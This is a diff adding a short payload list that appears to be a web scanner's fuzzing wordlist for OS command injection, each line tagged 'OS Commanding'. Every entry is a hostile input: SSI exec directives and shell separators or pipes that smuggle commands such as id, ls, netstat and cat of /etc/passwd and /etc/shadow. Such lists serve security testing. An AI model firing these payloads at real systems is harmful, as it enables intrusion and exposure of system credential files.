@@ -1,0 +1,21 @@
+/,%ENV,/:::OS Commanding
+&lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/passwd&quot;--&gt;:::OS Commanding
+<!--#exec cmd="/bin/cat /etc/passwd"-->:::OS Commanding
+&lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/shadow&quot;--&gt;:::OS Commanding
+<!--#exec cmd="/bin/cat /etc/shadow"-->:::OS Commanding
+`id`:::OS Commanding
+;id;:::OS Commanding
+;read;:::OS Commanding
+;netstat -a;:::OS Commanding
+\nnetstat -a%\n:::OS Commanding
+|id|:::OS Commanding
+|id:::OS Commanding
+|ls:::OS Commanding
+|ls -la:::OS Commanding
+;ls -la:::OS Commanding
+|/bin/ls -al:::OS Commanding
+\n/bin/ls -al\n:::OS Commanding
+/index.html|id|:::OS Commanding
+blah | uname -a;:::OS Commanding
+blah | /bin/cat /etc/passwd;:::OS Commanding
+blah | sudo /bin/cat /etc/passwd;:::OS Commanding
